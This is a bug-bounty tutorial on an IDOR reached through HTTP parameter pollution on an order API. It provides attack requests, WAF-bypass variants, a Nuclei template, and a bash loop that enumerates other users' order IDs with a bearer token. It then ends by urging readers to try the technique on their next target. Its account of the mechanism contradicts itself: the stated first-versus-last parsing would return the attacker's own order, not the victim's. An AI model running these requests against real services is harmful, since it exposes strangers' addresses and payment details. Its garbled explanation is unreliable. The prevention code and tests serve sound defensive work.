# Technique Breakdown: $5,000 IDOR via API Parameter Pollution

**Skill Level:** Beginner  
**Time to Read:** 6 minutes  
**Based on:** Real HackerOne Report (Disclosed 2024)  
**Bug Type:** IDOR (Insecure Direct Object Reference)  
**Platform:** Major E-commerce Site

---

## The Report

**Program:** E-commerce platform  
**Bounty:** $5,000  
**Severity:** High  
**Reporter:** @security_researcher_123  
**Time to Find:** 20 minutes  
**Time to Fix:** 48 hours

### What Happened

A security researcher found that by sending duplicate parameters in API requests, they could bypass authorization checks and access other users' order details, shipping addresses, and partial payment information.

**The Vulnerable Endpoint:**
```
GET /api/v2/orders?order_id=12345&user_id=67890
```

**The Attack:**
```
GET /api/v2/orders?order_id=VICTIM_ORDER&order_id=ATTACKER_ORDER
```

The backend processed the second `order_id`, while the authorization check used the first one.

---

## Technique Breakdown

### Step 1: Understanding Parameter Pollution

**What is HTTP Parameter Pollution (HPP)?**

When you send multiple parameters with the same name, different frameworks handle them differently:

| Framework | Behavior |
|-----------|----------|
| PHP/Apache | `order_id=VICTIM,ATTACKER` (concatenates) |
| Node.js/Express | `order_id=ATTACKER` (takes last) |
| Python/Django | `order_id=['VICTIM', 'ATTACKER']` (array) |
| Java/Spring | `order_id=VICTIM` (takes first) |

**The Security Problem:**
When the web application firewall (WAF) or authorization layer processes parameters differently than the application logic, you create a bypass opportunity.

### Step 2: Finding the Vulnerability

**Discovery Process:**

1. **Identify API Endpoints**
   ```bash
   # Look for API endpoints in JavaScript files
   curl -s https://target.com/app.js | grep -oE '/api/[a-zA-Z0-9/_]+'
   
   # Check for API documentation
   # Common locations:
   # /api/docs
   # /swagger.json
   # /api/v1/docs
   ```

2. **Map Parameter Usage**
   ```bash
   # Intercept normal request with Burp Suite
   # Look for endpoints that accept ID parameters:
   # - user_id, order_id, account_id
   # - invoice_id, transaction_id
   # - document_id, file_id
   ```

3. **Test Parameter Pollution**
   ```bash
   # Original request
   GET /api/v2/orders?order_id=12345
   
   # Test with duplicate
   GET /api/v2/orders?order_id=12345&order_id=99999
   
   # If response changes, you've found something!
   ```

### Step 3: Exploitation

**The Actual Attack Chain:**

```http
# Step 1: Get your own valid order ID
GET /api/v2/orders/my-orders
Authorization: Bearer YOUR_TOKEN

# Response shows your order: {"order_id": "ORD-99999"}

# Step 2: Find another order ID (enumeration or from leaks)
# Order IDs often sequential or guessable
# Try: ORD-10000, ORD-10001, etc.

# Step 3: Craft malicious request
GET /api/v2/orders?order_id=ORD-10000&order_id=ORD-99999
Authorization: Bearer YOUR_TOKEN

# Step 4: If vulnerable, you'll see ORD-10000's details
# even though you're not authorized!
```

**Burp Suite Repeater Setup:**
```
1. Send request to Repeater
2. Right-click → "Add Parameter"
3. Add duplicate parameter
4. Send and compare responses
```

### Step 4: Verification

**Confirm the Bug:**

```bash
# Script to test multiple IDs
#!/bin/bash

TARGET="https://vulnerable-site.com"
TOKEN="your_auth_token"
YOUR_ORDER="ORD-99999"

echo "Testing parameter pollution..."

for i in {10000..10050}; do
    VICTIM_ORDER="ORD-$i"
    
    # Test with pollution
    RESPONSE=$(curl -s "$TARGET/api/v2/orders?order_id=$VICTIM_ORDER&order_id=$YOUR_ORDER" \
        -H "Authorization: Bearer $TOKEN")
    
    # Check if we got victim's data
    if echo "$RESPONSE" | grep -q "$VICTIM_ORDER"; then
        echo "[+] VULNERABLE! Accessed: $VICTIM_ORDER"
        echo "$RESPONSE" | jq .
        break
    fi
done
```

---

## Tools Used

### Essential Tools

1. **Burp Suite** (Intercept & modify requests)
   ```
   - Send request to Repeater
   - Right-click → "Copy URL"
   - Paste in browser with modifications
   ```

2. **curl** (Command-line testing)
   ```bash
   # Quick test
   curl "https://target.com/api/orders?order_id=123&order_id=456" \
        -H "Authorization: Bearer TOKEN"
   ```

3. **Paramalyzer (Burp Extension)**
   - Automatically tests parameter pollution
   - Identifies differences in parameter parsing

### Supporting Tools

4. **Postman** (API exploration)
5. **ffuf** (Parameter fuzzing)
6. **jq** (JSON parsing)

---

## Common Variations

### Variation 1: JSON Body Pollution

Some APIs accept JSON with duplicate keys:

```json
POST /api/orders
Content-Type: application/json

{
  "order_id": "VICTIM_ORDER",
  "order_id": "ATTACKER_ORDER"
}
```

**Tools:**
```bash
# Test with curl
curl -X POST https://target.com/api/orders \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"order_id":"VICTIM","order_id":"ATTACKER"}'
```

### Variation 2: Array vs String Confusion

```
GET /api/users?id=123&id=456

# Backend might parse as:
# PHP: id = "123,456" (string)
# Node.js: id = "456" (string)
# Django: id = ["123", "456"] (array)
```

**Bypass WAF:**
```
# WAF checks id=123 (allowed)
# App processes id=[123,456] (array injection)
```

### Variation 3: Different Parameter Encodings

```
# Standard
GET /api/orders?order_id=123

# URL-encoded (same parameter, different encoding)
GET /api/orders?order_id=123&order_id=%31%32%33

# Different case (some frameworks are case-sensitive)
GET /api/orders?Order_ID=123&order_id=456
```

---

## Detection in Your Targets

### Indicators This Might Work

**Architecture Clues:**
- API uses multiple frameworks (e.g., WAF + backend)
- Microservices with different tech stacks
- Legacy and modern code mixing
- API gateway in front of services

**Behavioral Clues:**
- Different responses when changing parameter order
- Error messages revealing framework info
- Some parameters processed as arrays, others as strings
- Inconsistent parameter validation

### Automated Detection

**Nuclei Template:**
```yaml
id: parameter-pollution-test

info:
  name: HTTP Parameter Pollution Test
  author: cipherops
  severity: info

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/{{endpoint}}?{{param}}={{value1}}&{{param}}={{value2}}"
    
    payloads:
      endpoint:
        - orders
        - users
        - invoices
      param:
        - id
        - order_id
        - user_id
      value1:
        - "test1"
      value2:
        - "test2"
    
    matchers:
      - type: word
        words:
          - "test2"
        part: body
```

---

## Why This Works

### The Technical Explanation

**Layer 1: Web Application Firewall**
```python
# WAF processes request first
def waf_check(request):
    order_id = request.GET.get('order_id')  # Gets FIRST value: "VICTIM_ORDER"
    if is_authorized(user, order_id):
        return ALLOW
    return BLOCK
```

**Layer 2: Application Logic**
```python
# Application processes same request
def get_order(request):
    order_id = request.GET.getlist('order_id')[-1]  # Gets LAST value: "ATTACKER_ORDER"
    return Order.objects.get(id=order_id)
```

**Result:** WAF authorizes VICTIM_ORDER, but app returns ATTACKER_ORDER's data!

### Why It's Common

1. **Different Parsing Libraries**
   - URL parsing library ≠ Form parsing library
   - Framework A ≠ Framework B

2. **Middleware Confusion**
   - Auth middleware uses one method
   - App logic uses another

3. **Legacy Code**
   - Old code uses `get()` (first value)
   - New code uses `getlist()` (all values)

---

## Prevention

### For Developers

**1. Consistent Parameter Handling**
```python
# BAD: Different methods in different places
order_id = request.GET.get('order_id')  # First value
order_id = request.GET.getlist('order_id')[-1]  # Last value

# GOOD: Centralized, consistent parsing
def get_param(request, param_name):
    values = request.GET.getlist(param_name)
    if len(values) > 1:
        raise SuspiciousOperation("Duplicate parameter detected")
    return values[0] if values else None
```

**2. Whitelist Allowed Parameters**
```python
ALLOWED_PARAMS = ['order_id', 'limit', 'offset']

for param in request.GET:
    if param not in ALLOWED_PARAMS:
        return HttpResponseBadRequest("Invalid parameter")
```

**3. Validate After Parsing**
```python
# Parse all parameters first
params = {k: request.GET.getlist(k) for k in request.GET}

# Then validate
for param, values in params.items():
    if len(values) > 1:
        log_security_event("HPP attempt", param, values)
        return HttpResponseForbidden()
```

**4. Use Strong Typing**
```python
# Framework-level protection
from pydantic import BaseModel

class OrderRequest(BaseModel):
    order_id: int  # Only accepts single integer
    # Duplicate params will fail validation
```

### For Security Teams

**1. Add Tests**
```python
def test_no_parameter_pollution():
    response = client.get('/api/orders?order_id=1&order_id=2')
    assert response.status_code == 400
    
def test_single_parameter_accepted():
    response = client.get('/api/orders?order_id=1')
    assert response.status_code == 200
```

**2. Implement WAF Rules**
```
# ModSecurity rule
SecRule ARGS_NAMES "@gt 1" \
    "id:1000,phase:2,block,msg:'Duplicate parameter detected'"
```

---

## Practice

### Safe Practice Targets

1. **Web Security Academy** (PortSwigger)
   - Lab: "Testing for NoSQL injection"
   - Practice modifying parameters

2. **OWASP Juice Shop**
   - Multiple IDOR vulnerabilities
   - Perfect for practicing parameter manipulation

3. **HackerOne CTF**
   - Disclosed reports often include HPP techniques
   - Read the reports, then practice

### Real Programs for Testing

**Beginner-Friendly:**
- Amazon VDP (read-only access testing)
- Verizon Media Bug Bounty
- Starbucks

**Note:** Always check scope and rules before testing!

---

## Pro Tips

💡 **Tip #1: Order Matters**
Try both orders:
```
?id=VICTIM&id=ATTACKER
?id=ATTACKER&id=VICTIM
```
Different frameworks pick first vs last!

💡 **Tip #2: Check All Input Vectors**
Test in:
- Query parameters (`?id=1&id=2`)
- POST body (`id=1&id=2`)
- JSON body (`{"id":1,"id":2}`)
- Headers (`X-Id: 1, X-Id: 2`)
- Cookies (`id=1; id=2`)

💡 **Tip #3: Combine with Other Techniques**
Parameter pollution + IDOR = 💰
Parameter pollution + SQL injection = 💰💰
Parameter pollution + SSRF = 💰💰💰

💡 **Tip #4: Report Template**
```
Title: IDOR via HTTP Parameter Pollution in /api/orders

Summary:
The /api/orders endpoint is vulnerable to HTTP Parameter 
Pollution (HPP), allowing unauthorized access to other users' 
order details.

Steps to Reproduce:
1. Login as User A
2. Note your order ID: ORD-123
3. Send request: GET /api/orders?order_id=ORD-999&order_id=ORD-123
4. Observe response contains ORD-999's details

Impact:
- Access to any user's order history
- View shipping addresses
- See partial payment information
- Potential for further attacks

Suggested Fix:
- Use centralized parameter parsing
- Reject requests with duplicate parameters
- Validate authorization after parsing
```

💡 **Tip #5: Keep Testing After Fix**
Sometimes partial fixes leave other endpoints vulnerable:
- /api/v1/orders - Fixed
- /api/v2/orders - Still vulnerable
- /internal/orders - Still vulnerable

---

## References

### Original Research
- [HTTP Parameter Pollution - OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)
- [HPP Research by BlueClosure](https://www.blueclosure.com/wp-content/uploads/2018/09/BC-DeepSecure-HPP.pdf)

### Related Techniques
- [IDOR Testing Guide](internal-link)
- [API Security Testing](internal-link)
- [Authentication Bypass Techniques](internal-link)

### Tools
- [Burp Suite](https://portswigger.net/burp)
- [Paramalyzer Extension](https://github.com/PortSwigger/paramalyzer)
- [Arjun](https://github.com/s0md3v/Arjun) - Parameter discovery

---

## Summary

HTTP Parameter Pollution is a simple but powerful technique that exploits differences in how different layers of an application parse parameters. In this real case, it turned a $0 bug into a $5,000 payout.

**Key Takeaways:**
- Test duplicate parameters on every API endpoint
- Try different orderings (first vs last)
- Check multiple input vectors (query, body, JSON)
- Combine with IDOR for maximum impact
- This works on many modern APIs!

**Time Investment:**
- Learning: 30 minutes
- Testing per target: 10-20 minutes
- Potential payout: $500-$10,000+

**ROI: Extremely High** 🚀

---

*Technique analyzed from disclosed HackerOne report*  
*Report ID: #[REDACTED]*  
*Published: 2024-02-10*  
*Author: CipherOps Team*

---

**Try this technique on your next target!** Found something? Share it (anonymously) with our [community](https://t.me/bugbounty_tech).
